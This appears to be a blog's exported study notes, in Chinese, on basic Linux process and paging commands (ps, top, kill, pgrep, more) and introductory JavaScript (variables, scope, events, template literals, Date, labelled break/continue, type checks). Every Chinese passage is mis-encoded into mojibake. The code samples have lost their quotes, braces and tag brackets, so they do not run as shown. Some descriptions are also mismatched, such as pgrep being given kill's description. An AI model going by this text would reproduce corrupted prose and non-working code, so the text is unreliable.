å¯¹éç©ºè¾“å‡ºè¡Œç¼–å· -n å¯¹è¾“å‡ºçš„æ‰€æœ‰è¡Œç¼–å· moreå‘½ä»¤å¯¹åº”å•è¯ï¼š more åŠŸèƒ½ï¼š åˆ†å±æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ ä½¿ç”¨ more çš„æ“ä½œé”®ï¼š æ“ä½œé”® åŠŸèƒ½ ç©ºæ ¼é”® æ˜¾ç¤ºæ‰‹å†Œé¡µçš„ä¸‹ä¸€å± Enter é”® ä¸€æ¬¡æ»šåŠ¨æ‰‹å†Œé¡µçš„ä¸€è¡Œ b å›æ»šä¸€å± f å‰æ»šä¸€å± q é€€å‡º word æœç´¢ word å­—ç¬¦ä¸² echoå‘½ä»¤å¯¹åº”å•è¯ï¼š more åŠŸèƒ½ï¼š åœ¨ç»ˆç«¯ä¸­æ˜¾ç¤ºå‚æ•°æŒ‡å®šçš„æ–‡å­—ï¼Œé€šå¸¸ä¼šå’Œé‡å®šå‘è”åˆä½¿ç”¨ è¿›ç¨‹å‘½ä»¤pså‘½ä»¤ï¼šè‹±æ–‡ï¼š process status ä½œç”¨ï¼šæ˜¾ç¤ºå½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„å¿«ç…§ã€‚ å‘½ä»¤ ä½œç”¨ ps aux æŸ¥çœ‹è¿›ç¨‹çš„è¯¦ç»†çŠ¶å†µ ps -ef æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹çš„å®Œæ•´ä¿¡æ¯ ps è¿›ç¨‹ä»£å· æ˜¾ç¤ºç‰¹å®šè¿›ç¨‹ä»£å·çš„è¯¦ç»†ä¿¡æ¯ top kill [-9] è¿›ç¨‹ä»£å· ç»ˆæ­¢æŒ‡å®šä»£å·çš„è¿›ç¨‹ï¼Œ -9 è¡¨ç¤ºå¼ºè¡Œç»ˆæ­¢ ps é»˜è®¤åªä¼šæ˜¾ç¤ºå½“å‰ç”¨æˆ·é€šè¿‡ç»ˆç«¯å¯åŠ¨çš„åº”ç”¨ç¨‹åº ps é€‰é¡¹è¯´æ˜ é€‰é¡¹ å«ä¹‰ a æ˜¾ç¤ºç»ˆç«¯ä¸Šçš„æ‰€æœ‰è¿›ç¨‹ï¼ŒåŒ…æ‹¬å…¶ä»–ç”¨æˆ·çš„è¿›ç¨‹ u æ˜¾ç¤ºè¿›ç¨‹çš„è¯¦ç»†çŠ¶æ€ x æ˜¾ç¤ºæ²¡æœ‰æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹ topå‘½ä»¤ï¼šä½œç”¨ï¼š åŠ¨æ€æ˜¾ç¤ºè¿è¡Œä¸­çš„è¿›ç¨‹å¹¶ä¸”å¯ä»¥æŒ‰ CPU ä½¿ç”¨ç‡ã€å†…å­˜ä½¿ç”¨ç‡ç­‰å¯¹è¿›ç¨‹è¿›è¡Œæ’åº è¾“å…¥ qé€€å‡º top å‘½ä»¤ç•Œé¢ killå‘½ä»¤ï¼šä½œç”¨ï¼š å‘è¿›ç¨‹å‘é€ä¿¡å·ä»¥ç»ˆæ­¢æˆ–æ“ä½œè¿›ç¨‹ å¸¸è§ç”¨æ³• å‘½ä»¤ ä½œç”¨ kill è¿›ç¨‹ä»£å· å‘æŒ‡å®šè¿›ç¨‹ä»£å·çš„è¿›ç¨‹å‘é€é»˜è®¤çš„ç»ˆæ­¢ä¿¡å· kill -9 è¿›ç¨‹ä»£å· å‘æŒ‡å®šè¿›ç¨‹ä»£å·çš„è¿›ç¨‹å‘é€å¼ºåˆ¶ç»ˆæ­¢ä¿¡å· æç¤ºï¼šä½¿ç”¨ kill å‘½ä»¤æ—¶ï¼Œæœ€å¥½åªç»ˆæ­¢ç”±å½“å‰ç”¨æˆ·å¼€å¯çš„è¿›ç¨‹ï¼Œè€Œä¸è¦ç»ˆæ­¢ root èº«ä»½å¼€å¯çš„è¿›ç¨‹ï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´ç³»ç»Ÿå´©æºƒ pgrepå‘½ä»¤ï¼šä½œç”¨ï¼š å‘è¿›ç¨‹å‘é€ä¿¡å·ä»¥ç»ˆæ­¢æˆ–æ“ä½œè¿›ç¨‹ PLAINTEXTpgrep [é€‰é¡¹] è¿›ç¨‹åç§° å…¶ä¸­ï¼Œè¿›ç¨‹åç§° æ˜¯è¦åŒ¹é…çš„è¿›ç¨‹åç§°æˆ–æ¨¡å¼ã€‚å¯ä»¥ä½¿ç”¨é€šé…ç¬¦è¿›è¡Œæ¨¡ç³ŠåŒ¹é…ã€‚ å¯é€‰é€‰é¡¹ è¯´æ˜ -u ç”¨æˆ·å æ ¹æ®ç”¨æˆ·åè¿‡æ»¤è¿›ç¨‹ã€‚ -n ä»…è¿”å›æœ€æ–°çš„åŒ¹é…è¿›ç¨‹çš„è¿›ç¨‹ IDã€‚ -x ç²¾ç¡®åŒ¹é…è¿›ç¨‹åç§°ï¼Œä¸è¿›è¡Œæ¨¡ç³ŠåŒ¹é…ã€‚ -d åˆ†éš”ç¬¦ æŒ‡å®šè¾“å‡ºçš„åˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸ºæ¢è¡Œç¬¦ã€‚"},{"title":"JvaScriptç¬”è®°","path":"/2024/01/20/JavaScript_max/JvaScriptç¬”è®°/","content":"æ–‡ä¸­ä»£ç è‹¥æ— ç‰¹åˆ«è¯´æ˜é‚£ä¹ˆéƒ½æ˜¯å†™åœ¨å†…çš„ åŸºç¡€åˆè¯†JavaScript å¯ä»¥é€šè¿‡ä¸åŒçš„æ–¹å¼æ¥è¾“å‡ºæ•°æ®ï¼š ä½¿ç”¨ window.alert() å¼¹å‡ºè­¦å‘Šæ¡†æ¥æ˜¾ç¤ºæ•°æ®ã€‚ ä½¿ç”¨ document.write() æ–¹æ³•å°†å†…å®¹å†™åˆ° HTML æ–‡æ¡£ä¸­ã€‚ ä½¿ç”¨ innerHTML å†™å…¥åˆ° HTML å…ƒç´ ã€‚ ä½¿ç”¨ console.log() å†™å…¥åˆ°æµè§ˆå™¨çš„æ§åˆ¶å°ã€‚ å¦‚éœ€ä» JavaScript è®¿é—®æŸä¸ª HTML å…ƒç´ ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ document.getElementById(id) æ–¹æ³•ã€‚ è¯·ä½¿ç”¨ â€œidâ€ å±æ€§æ¥æ ‡è¯† HTML å…ƒç´ ï¼Œå¹¶ innerHTML æ¥è·å–æˆ–æ’å…¥å…ƒç´ å†…å®¹ï¼š scriptdocument.getElementById(demo).innerHTML = æ®µè½å·²ä¿®æ”¹ã€‚;/script JavaScript ä½¿ç”¨å…³é”®å­— var æ¥å®šä¹‰å˜é‡ï¼Œ ä½¿ç”¨ç­‰å·æ¥ä¸ºå˜é‡èµ‹å€¼ var length; å˜é‡çš„æ•°æ®ç±»å‹å¯ä»¥ä½¿ç”¨ typeof æ“ä½œç¬¦æ¥æŸ¥çœ‹ å¯ä»¥åœ¨å­—ç¬¦ä¸²ä¸­ä½¿ç”¨å¼•å·ï¼Œåªè¦ä¸åŒ¹é…åŒ…å›´å­—ç¬¦ä¸²çš„å¼•å·å³å¯ å•è¡Œæ³¨é‡Šï¼š//åé¢æ¥å†…å®¹ å¤šè¡Œæ³¨é‡Šä»¥ * å¼€å§‹ï¼Œä»¥ ***** ç»“å°¾ã€‚ æ³¨é‡Šç”¨äºé˜»æ­¢å…¶ä¸­ä¸€æ¡ä»£ç è¡Œçš„æ‰§è¡Œï¼ˆå¯ç”¨äºè°ƒè¯•ï¼‰ break ç”¨äºè·³å‡ºå¾ªç¯ã€‚ catch è¯­å¥å—ï¼Œåœ¨ try è¯­å¥å—æ‰§è¡Œå‡ºé”™æ—¶æ‰§è¡Œ catch è¯­å¥å—ã€‚ continue è·³è¿‡å¾ªç¯ä¸­çš„ä¸€ä¸ªè¿­ä»£ã€‚ do â€¦ while æ‰§è¡Œä¸€ä¸ªè¯­å¥å—ï¼Œåœ¨æ¡ä»¶è¯­å¥ä¸º true æ—¶ç»§ç»­æ‰§è¡Œè¯¥è¯­å¥å—ã€‚ for åœ¨æ¡ä»¶è¯­å¥ä¸º true æ—¶ï¼Œå¯ä»¥å°†ä»£ç å—æ‰§è¡ŒæŒ‡å®šçš„æ¬¡æ•°ã€‚ for â€¦ in ç”¨äºéå†æ•°ç»„æˆ–è€…å¯¹è±¡çš„å±æ€§ï¼ˆå¯¹æ•°ç»„æˆ–è€…å¯¹è±¡çš„å±æ€§è¿›è¡Œå¾ªç¯æ“ä½œï¼‰ã€‚ function å®šä¹‰ä¸€ä¸ªå‡½æ•° if â€¦ else ç”¨äºåŸºäºä¸åŒçš„æ¡ä»¶æ¥æ‰§è¡Œä¸åŒçš„åŠ¨ä½œã€‚ return é€€å‡ºå‡½æ•° switch ç”¨äºåŸºäºä¸åŒçš„æ¡ä»¶æ¥æ‰§è¡Œä¸åŒçš„åŠ¨ä½œã€‚ throw æŠ›å‡ºï¼ˆç”Ÿæˆï¼‰é”™è¯¯ ã€‚ try å®ç°é”™è¯¯å¤„ç†ï¼Œä¸ catch ä¸€åŒä½¿ç”¨ã€‚ var å£°æ˜ä¸€ä¸ªå˜é‡ã€‚ while å½“æ¡ä»¶è¯­å¥ä¸º true æ—¶ï¼Œæ‰§è¡Œè¯­å¥å—ã€‚ ä»£ç å°†ä¿®æ”¹è‡ªèº«å…ƒç´ çš„å†…å®¹ (ä½¿ç”¨ this.innerHTML): button onclick=this.innerHTML=Date()ç°åœ¨çš„æ—¶é—´æ˜¯?/button å¯¹è±¡ å¯¹è±¡å±æ€§æœ‰ä¸¤ç§å¯»å€æ–¹å¼ scriptvar person=\tfirstname : John,\tlastname : Doe,\tid : 5566;document.write(person.lastname + br);document.write(person[lastname] + br);/script Undefined è¿™ä¸ªå€¼è¡¨ç¤ºå˜é‡ä¸å«æœ‰å€¼ã€‚ å¯ä»¥é€šè¿‡å°†å˜é‡çš„å€¼è®¾ç½®ä¸º null æ¥æ¸…ç©ºå˜é‡ å½“æ‚¨å£°æ˜æ–°å˜é‡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å…³é”®è¯ â€œnewâ€ æ¥å£°æ˜å…¶ç±»å‹ var carname=new String; ä½œç”¨åŸŸåœ¨ JavaScript ä¸­, å¯¹è±¡å’Œå‡½æ•°åŒæ ·ä¹Ÿæ˜¯å˜é‡ã€‚ åœ¨ JavaScript ä¸­, ä½œç”¨åŸŸä¸ºå¯è®¿é—®å˜é‡ï¼Œå¯¹è±¡ï¼Œå‡½æ•°çš„é›†åˆã€‚ JavaScript å‡½æ•°ä½œç”¨åŸŸ: ä½œç”¨åŸŸåœ¨å‡½æ•°å†…ä¿®æ”¹ã€‚ å±€éƒ¨ä½œç”¨åŸŸ å˜é‡åœ¨å‡½æ•°å†…å£°æ˜ï¼Œå˜é‡ä¸ºå±€éƒ¨å˜é‡ï¼Œå…·æœ‰å±€éƒ¨ä½œç”¨åŸŸã€‚ å±€éƒ¨å˜é‡ï¼šåªèƒ½åœ¨å‡½æ•°å†…éƒ¨è®¿é—®ã€‚ å±€éƒ¨å˜é‡åœ¨å‡½æ•°å¼€å§‹æ‰§è¡Œæ—¶åˆ›å»ºï¼Œå‡½æ•°æ‰§è¡Œå®Œåå±€éƒ¨å˜é‡ä¼šè‡ªåŠ¨é”€æ¯ã€‚ å…¨å±€å˜é‡ å˜é‡åœ¨å‡½æ•°å¤–å®šä¹‰ï¼Œå³ä¸ºå…¨å±€å˜é‡ã€‚ å…¨å±€å˜é‡æœ‰ å…¨å±€ä½œç”¨åŸŸ: ç½‘é¡µä¸­æ‰€æœ‰è„šæœ¬å’Œå‡½æ•°å‡å¯ä½¿ç”¨ã€‚ å¦‚æœå˜é‡åœ¨å‡½æ•°å†…æ²¡æœ‰å£°æ˜ï¼ˆæ²¡æœ‰ä½¿ç”¨ var å…³é”®å­—ï¼‰ï¼Œè¯¥å˜é‡ä¸ºå…¨å±€å˜é‡ã€‚ // æ­¤å¤„å¯è°ƒç”¨ carName å˜é‡function myFunction() carName = Volvo; // æ­¤å¤„å¯è°ƒç”¨ carName å˜é‡ äº‹ä»¶å¸¸è§çš„HTMLäº‹ä»¶çš„åˆ—è¡¨ï¼š äº‹ä»¶ æè¿° onchange HTML å…ƒç´ æ”¹å˜ onclick ç”¨æˆ·ç‚¹å‡» HTML å…ƒç´  onmouseover é¼ æ ‡æŒ‡é’ˆç§»åŠ¨åˆ°æŒ‡å®šçš„å…ƒç´ ä¸Šæ—¶å‘ç”Ÿ onmouseout ç”¨æˆ·ä»ä¸€ä¸ª HTML å…ƒç´ ä¸Šç§»å¼€é¼ æ ‡æ—¶å‘ç”Ÿ onkeydown ç”¨æˆ·æŒ‰ä¸‹é”®ç›˜æŒ‰é”® onload æµè§ˆå™¨å·²å®Œæˆé¡µé¢çš„åŠ è½½ å­—ç¬¦ä¸²å¯ä»¥ä½¿ç”¨å†…ç½®å±æ€§ length æ¥è®¡ç®—å­—ç¬¦ä¸²çš„é•¿åº¦ **match()**å‡½æ•°ç”¨æ¥æŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­ç‰¹å®šçš„å­—ç¬¦ï¼Œå¹¶ä¸”å¦‚æœæ‰¾åˆ°çš„è¯ï¼Œåˆ™è¿”å›è¿™ä¸ªå­—ç¬¦ï¼šdocument.write(str.match(world!)); replace() æ–¹æ³•åœ¨å­—ç¬¦ä¸²ä¸­ç”¨æŸäº›å­—ç¬¦æ›¿æ¢å¦ä¸€äº›å­—ç¬¦ï¼švar txt = str.replace(Microsoft,Runoob); åœ¨ JavaScript ä¸­ï¼Œå­—ç¬¦ä¸²å†™åœ¨å•å¼•å·æˆ–åŒå¼•å·ä¸­ã€‚ å› ä¸ºè¿™æ ·ï¼Œä»¥ä¸‹å®ä¾‹ JavaScript æ— æ³•è§£æï¼šWe are the so-called Vikings from the north. å­—ç¬¦ä¸² â€œWe are the so-called â€œ è¢«æˆªæ–­ã€‚ å¦‚ä½•è§£å†³ä»¥ä¸Šçš„é—®é¢˜å‘¢ï¼Ÿå¯ä»¥ä½¿ç”¨åæ–œæ  () æ¥è½¬ä¹‰ â€œVikingsâ€ å­—ç¬¦ä¸²ä¸­çš„åŒå¼•å·ï¼Œå¦‚ä¸‹: We are the so-called \\Vikings\\ from the north. åæ–œæ æ˜¯ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦ã€‚ è½¬ä¹‰å­—ç¬¦å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸ºå­—ç¬¦ä¸²å­—ç¬¦ å•å¼•å· åŒå¼•å· \\ åæ–œæ  æ¢è¡Œ \\r å›è½¦ \\t tab(åˆ¶è¡¨ç¬¦) \\b é€€æ ¼ç¬¦ \\f æ¢é¡µç¬¦ æ¨¡æ¿å­—ç¬¦ä¸² JavaScript ä¸­çš„æ¨¡æ¿å­—ç¬¦ä¸²æ˜¯ä¸€ç§æ–¹ä¾¿çš„å­—ç¬¦ä¸²è¯­æ³•ï¼Œå…è®¸ä½ åœ¨å­—ç¬¦ä¸²ä¸­åµŒå…¥è¡¨è¾¾å¼å’Œå˜é‡ã€‚ æ¨¡æ¿å­—ç¬¦ä¸²ä½¿ç”¨åå¼•å· ä½œä¸ºå­—ç¬¦ä¸²çš„å®šç•Œç¬¦åˆ†éš”çš„å­—é¢é‡ã€‚ æ¨¡æ¿å­—é¢é‡æ˜¯ç”¨åå¼•å·ï¼ˆ****ï¼‰åˆ†éš”çš„å­—é¢é‡ï¼Œå…è®¸å¤šè¡Œå­—ç¬¦ä¸²ã€å¸¦åµŒå…¥è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æ’å€¼å’Œä¸€ç§å«å¸¦æ ‡ç­¾çš„æ¨¡æ¿çš„ç‰¹æ®Šç»“æ„ã€‚ è¯­æ³• `string text``string text line 1 string text line 2``string text $expression string text`tagFunction`string text $expression string text` å‚æ•° string textï¼šå°†æˆä¸ºæ¨¡æ¿å­—é¢é‡çš„ä¸€éƒ¨åˆ†çš„å­—ç¬¦ä¸²æ–‡æœ¬ã€‚å‡ ä¹å…è®¸æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦å’Œå…¶ä»–ç©ºç™½å­—ç¬¦ã€‚ä½†æ˜¯ï¼Œé™¤éä½¿ç”¨äº†æ ‡ç­¾å‡½æ•°ï¼Œå¦åˆ™æ— æ•ˆçš„è½¬ä¹‰åºåˆ—å°†å¯¼è‡´è¯­æ³•é”™è¯¯ã€‚ expressionï¼šè¦æ’å…¥å½“å‰ä½ç½®çš„è¡¨è¾¾å¼ï¼Œå…¶å€¼è¢«è½¬æ¢ä¸ºå­—ç¬¦ä¸²æˆ–ä¼ é€’ç»™ tagFunctionã€‚ tagFunctionï¼šå¦‚æœæŒ‡å®šï¼Œå°†ä½¿ç”¨æ¨¡æ¿å­—ç¬¦ä¸²æ•°ç»„å’Œæ›¿æ¢è¡¨è¾¾å¼è°ƒç”¨å®ƒï¼Œè¿”å›å€¼å°†æˆä¸ºæ¨¡æ¿å­—é¢é‡çš„å€¼ã€‚ script let text=`Nice!`; document.getElementById(demo).innerHTML=text;/script ï¼ˆæ³¨æ„ï¼šå˜é‡åå‰é¢æœ€å¥½æ˜¯ letæˆ–è€… constï¼‰ æ¨¡æ¿å­—ç¬¦ä¸²æ”¯æŒåŒæ—¶ä½¿ç”¨å•å¼•å·å’ŒåŒå¼•å·ï¼›æ”¯æŒå¤šè¡Œæ–‡æœ¬è€Œæ— éœ€è½¬ä¹‰å­—ç¬¦ è‹¥è¦è½¬ä¹‰æ¨¡æ¿å­—é¢é‡ä¸­çš„åå¼•å·ï¼ˆ**ï¼‰ï¼Œéœ€åœ¨åå¼•å·ä¹‹å‰åŠ ä¸€ä¸ªåæ–œæ ï¼ˆ**ï¼‰ã€‚ `\\`` === `; // true æ¨¡æ¿å­—é¢é‡ç”¨åå¼•å·ï¼ˆ**ï¼‰æ‹¬èµ·æ¥ï¼Œè€Œä¸æ˜¯åŒå¼•å·ï¼ˆâ€œï¼‰æˆ–å•å¼•å·ï¼ˆâ€˜**ï¼‰ã€‚ é™¤äº†æ™®é€šå­—ç¬¦ä¸²å¤–ï¼Œæ¨¡æ¿å­—é¢é‡è¿˜å¯ä»¥åŒ…å«å ä½ç¬¦â€”â€”ä¸€ç§ç”±ç¾å…ƒç¬¦å·å’Œå¤§æ‹¬å·åˆ†éš”çš„åµŒå…¥å¼è¡¨è¾¾å¼ï¼š**${expression}**ã€‚ å­—ç¬¦ä¸²å’Œå ä½ç¬¦è¢«ä¼ é€’ç»™ä¸€ä¸ªå‡½æ•°ï¼ˆè¦ä¹ˆæ˜¯é»˜è®¤å‡½æ•°ï¼Œè¦ä¹ˆæ˜¯è‡ªå®šä¹‰å‡½æ•°ï¼‰ã€‚é»˜è®¤å‡½æ•°ï¼ˆå½“æœªæä¾›è‡ªå®šä¹‰å‡½æ•°æ—¶ï¼‰åªæ‰§è¡Œå­—ç¬¦ä¸²æ’å€¼æ¥æ›¿æ¢å ä½ç¬¦ï¼Œç„¶åå°†è¿™äº›éƒ¨åˆ†æ‹¼æ¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚ æ¨¡æ¿å­—ç¬¦ä¸²ä¸­å…è®¸æˆ‘ä»¬ä½¿ç”¨å˜é‡ scriptconst name = Runoob;const age = 30;const message = `My name is $name and Im $age years old.`;document.getElementById(demo).innerHTML = message;/script æ¨¡æ¿å­—ç¬¦ä¸²ä¸­å…è®¸æˆ‘ä»¬ä½¿ç”¨è¡¨è¾¾å¼ let price = 10;let VAT = 0.25;let total = `Total: $(price * (1 + VAT)).toFixed(2)`; æ¨¡æ¿å­—ç¬¦ä¸²å½“ä½œ HTML æ¨¡æ¿ä½¿ç”¨ let header = ;let tags = [RUNOOB, GOOGLE, TAOBAO];let html = `h2$header/h2ul`;for (const x of tags) html += `li$x/li`;html += `/ul`; Date()å¯¹è±¡åˆ›å»ºæ—¥æœŸ å‚æ•°å¤§å¤šæ•°éƒ½æ˜¯å¯é€‰çš„ï¼Œåœ¨ä¸æŒ‡å®šçš„æƒ…å†µä¸‹ï¼Œé»˜è®¤å‚æ•°æ˜¯0ã€‚ new Date(); var today = new Date()new Date(value); var d1 = new Date(October 13, 1975 11:13:00)new Date(dateString); var d2 = new Date(79,5,24)new Date(year, monthIndex [, day [, hours [, minutes [, seconds [, milliseconds]]]]]);var d3 = new Date(79,5,24,11,33,0) è®¾ç½®æ—¥æœŸ ä¸‹é¢ä¾‹å­æ˜¯è®¾å®šä¸€ä¸ªç‰¹å®šçš„æ—¥æœŸ var myDate=new Date();myDate.setFullYear(2010,0,14);// ç¬¬äºŒä¸ªå‚æ•°ä¸ºæœˆä»½ï¼Œ 0 åˆ° 11 ä¹‹é—´çš„æ•´æ•°å€¼ï¼Œè¡¨ç¤ºä»ä¸€æœˆåˆ°åäºŒæœˆ è¿™ä¸ªä¾‹å­æ˜¯è®¾æˆäº”å¤©åçš„æ—¥æœŸ var myDate=new Date();myDate.setDate(myDate.getDate()+5); å¦‚æœå¢åŠ å¤©æ•°ä¼šæ”¹å˜æœˆä»½æˆ–è€…å¹´ä»½ï¼Œé‚£ä¹ˆæ—¥æœŸå¯¹è±¡ä¼šè‡ªåŠ¨å®Œæˆè¿™ç§è½¬æ¢ã€‚ ForInå¾ªç¯éå†å¯¹è±¡çš„å±æ€§ï¼š scriptfunction myFunction()\tvar x;\tvar txt=;\tvar person=fname:Bill,lname:Gates,age:56; for (x in person) txt=txt + person[x]; document.getElementById(demo).innerHTML=txt;/script JavaScript æ ‡ç­¾ä¸ break å’Œ continue ä¸€èµ·ä½¿ç”¨çš„ç†è§£å¦‚éœ€æ ‡è®° JavaScript è¯­å¥ï¼Œè¯·åœ¨è¯­å¥ä¹‹å‰åŠ ä¸Šå†’å·ï¼šlable: break å’Œ continue è¯­å¥ä»…ä»…æ˜¯èƒ½å¤Ÿè·³å‡ºä»£ç å—çš„è¯­å¥ã€‚è¯­æ³•å¦‚ä¸‹ï¼š break labelname;continue labelname; break çš„ä½œç”¨æ˜¯è·³å‡ºä»£ç å—, æ‰€ä»¥ break å¯ä»¥ä½¿ç”¨äºå¾ªç¯å’Œ switch ç­‰ continue çš„ä½œç”¨æ˜¯è¿›å…¥ä¸‹ä¸€ä¸ªè¿­ä»£, æ‰€ä»¥ continue åªèƒ½ç”¨äºå¾ªç¯çš„ä»£ç å—ã€‚ ä»£ç å—: åŸºæœ¬ä¸Šæ˜¯ï½›ï½å¤§æ‹¬å·ä¹‹é—´ ç„¶åï¼š é»˜è®¤æ ‡ç­¾çš„æƒ…å†µï¼ˆé™¤äº†é»˜è®¤æ ‡ç­¾æƒ…å†µï¼Œå…¶ä»–æ—¶å€™å¿…é¡»è¦æœ‰åæ ‡ç­¾ï¼Œå¦åˆ™ä¼šæœ‰æƒŠå–œï¼‰ å½“ break å’Œ continue åŒæ—¶ç”¨äºå¾ªç¯æ—¶ï¼Œæ²¡æœ‰åŠ æ ‡ç­¾ï¼Œæ­¤æ—¶é»˜è®¤æ ‡ç­¾ä¸ºå½“å‰â€å¾ªç¯â€çš„ä»£ç å—ã€‚ å½“ break ç”¨äº switch æ—¶ï¼Œé»˜è®¤æ ‡ç­¾ä¸ºå½“å‰çš„ switch ä»£ç å—: æœ‰åæ ‡ç­¾çš„æƒ…å†µ cars=[BMW,Volvo,Saab,Ford];list: document.write(cars[0] + ); document.write(cars[1] + ); document.write(cars[2] + ); break list; document.write(cars[3] + ); document.write(cars[4] + ); document.write(cars[5] + ); ä¸Šè¿°break list;ä¼šè·³å‡ºlistçš„ä»£ç å—ã€‚å¦‚æœå°†breakæ¢æˆcontinueä¼šæœ‰æƒŠå–œï¼ˆä¼šæŠ¥é”™ï¼‰ï¼Œè¿åäº†æ˜ç¡®ä¸­çš„ç¬¬äºŒç‚¹ï¼Œå› ä¸ºliståªæ˜¯ä¸ªæ™®é€šä»£ç å—ï¼Œè€Œä¸æ˜¯å¾ªç¯ã€‚é™¤élistå†™æˆå¦‚ä¸‹å½¢å¼ list: for(var i=0; i10; ++i) continue list; æœ‰äº†æ ‡ç­¾ï¼Œå¯ä»¥ä½¿ç”¨breakå’Œcontinueåœ¨å¤šå±‚å¾ªç¯çš„æ—¶å€™æ§åˆ¶å¤–å±‚å¾ªç¯ã€‚ ä¾‹å¦‚ä¸‹é¢ï¼š outerloop:for (var i = 0; i 10; i++) innerloop: for (var j = 0; j 10; j++) if (j 3) break; if (i == 2) break innerloop; if (i == 4) break outerloop; document.write(i= + i + j= + j + ); undefinedä¸null null è¡¨ç¤º â€œä»€ä¹ˆéƒ½æ²¡æœ‰â€ï¼Œæ˜¯ä¸€ä¸ªåªæœ‰ä¸€ä¸ªå€¼çš„ç‰¹æ®Šç±»å‹ã€‚è¡¨ç¤ºä¸€ä¸ªç©ºå¯¹è±¡å¼•ç”¨ã€‚ undefined æ˜¯ä¸€ä¸ªæ²¡æœ‰è®¾ç½®å€¼çš„å˜é‡ã€‚typeof ä¸€ä¸ªæ²¡æœ‰å€¼çš„å˜é‡ä¼šè¿”å› undefined typeof undefined // undefinedtypeof null // objectnull === undefined // falsenull == undefined // true ä¸¤è€…å€¼ç›¸ç­‰ä½†æ˜¯ç±»å‹ä¸ç›¸ç­‰ ç±»å‹è½¬æ¢Number() è½¬æ¢ä¸ºæ•°å­—ï¼Œ String() è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œ Boolean() è½¬æ¢ä¸ºå¸ƒå°”å€¼ 6 ç§ä¸åŒçš„æ•°æ®ç±»å‹ï¼šstringï¼Œnumberï¼Œbooleanï¼Œobjectï¼Œfunctionï¼Œsymbol 3 ç§å¯¹è±¡ç±»å‹ï¼šObjectï¼ŒDateï¼ŒArray 2 ä¸ªä¸åŒ…å«ä»»ä½•å€¼çš„æ•°æ®ç±»å‹ï¼šnullï¼Œundefined æ³¨æ„ï¼šä½¿ç”¨typrofæ“ä½œç¬¦ä¸èƒ½åˆ¤æ–­æ˜¯Arrayè¿˜æ˜¯Dateï¼Œå› ä¸ºå®ƒä¸¤è¿”å›çš„æ•°æ®ç±»å‹éƒ½æ˜¯object constructorå±æ€§ è¿”å›æ‰€æœ‰ JavaScript å˜é‡çš„æ„é€ å‡½æ•° John.constructor // è¿”å›å‡½æ•° String() [native code] (3.14).constructor // è¿”å›å‡½æ•° Number() [native code] false.constructor // è¿”å›å‡½æ•° Boolean() [native code] [1,2,3,4].constructor // è¿”å›å‡½æ•° Array() [native code] name:John, age:34.constructor // è¿”å›å‡½æ•° Object() [native code] new Date().constructor // è¿”å›å‡½æ•° Date() [native code] function () .constructor // è¿”å›å‡½æ•° Function() [native code] æŸ¥çœ‹å¯¹è±¡æ˜¯å¦ä¸ºæ•°ç»„çš„æ–¹æ³• ç¬¬ä¸€ç§ï¼šä½¿ç”¨constructorå±æ€§æ¥åˆ¤æ–­ var fruits=[banana,orange,apple];document.getElementById(demo).innerHTML=checkArray(fruits);function checkArray(Array) return Array.constructor.toString().indexOf(Array)-1; return myArray.constructor.toString().indexOf(Array) -1;ï¼šè¿™è¡Œä»£ç ä½¿ç”¨ constructor å±æ€§è·å–ä¼ å…¥æ•°ç»„çš„æ„é€ å‡½æ•°ï¼Œå°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶æ£€æŸ¥å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å« â€œArrayâ€ã€‚å¦‚æœåŒ…å«ï¼Œè¿”å› true è¡¨ç¤ºæ˜¯æ•°ç»„ï¼Œå¦åˆ™è¿”å› false è¡¨ç¤ºä¸æ˜¯æ•°ç»„ã€‚ ç¬¬äºŒç§ï¼šä½¿ç”¨å†…ç½®å‡½æ•°æ¥åˆ¤æ–­ï¼ˆgptå‘Šè¯‰æˆ‘çš„ï¼Œæ›´ä¸ºç®€ä¾¿ï¼‰ Array.isArray() æ–¹æ³•ï¼Œå®ƒæ˜¯ JavaScript çš„å†…å»ºæ–¹æ³•ï¼Œä¸“é—¨ç”¨äºæ£€æŸ¥ä¸€ä¸ªå¯¹è±¡æ˜¯å¦æ˜¯æ•°ç»„ document.getElementById(demo).innerHTML = Array.isArray(fruits); æŸ¥çœ‹å¯¹è±¡æ˜¯å¦ä¸ºæ—¥æœŸçš„æ–¹æ³• ç¬¬ä¸€ç§åŒä¸Š ç¬¬äºŒç§ä½¿ç”¨ instanceof å…³é”®å­—å¯ä»¥ç¡®å®šä¸€ä¸ªå¯¹è±¡æ˜¯å¦å±äºç‰¹å®šçš„æ„é€ å‡½æ•° var myDate = new Date();if (myDate instanceof Date) console.log(myDate æ˜¯ä¸€ä¸ª Date å¯¹è±¡); else console.log(myDate ä¸æ˜¯ä¸€ä¸ª Date å¯¹è±¡); å…¶ä¸­çš„ console.logè¢«ç”¨äºè¾“å‡ºå­—ç¬¦ä¸²åˆ°æ§åˆ¶å°ï¼Œå…·ä½“å–å†³äº myDate å¯¹è±¡æ˜¯å¦æ˜¯ Date ç±»å‹ã€‚å¦‚æœæ˜¯ Date ç±»å‹ï¼Œå°†è¾“å‡º myDate æ˜¯ä¸€ä¸ª Date å¯¹è±¡ï¼Œå¦åˆ™å°†è¾“å‡º myDate ä¸æ˜¯ä¸€ä¸ª Date å¯¹è±¡ã€‚ï¼ˆæ‘F12æˆ–è€…ç›´æ¥æŸ¥çœ‹å¼€å‘è€…å·¥å…·ï¼‰ 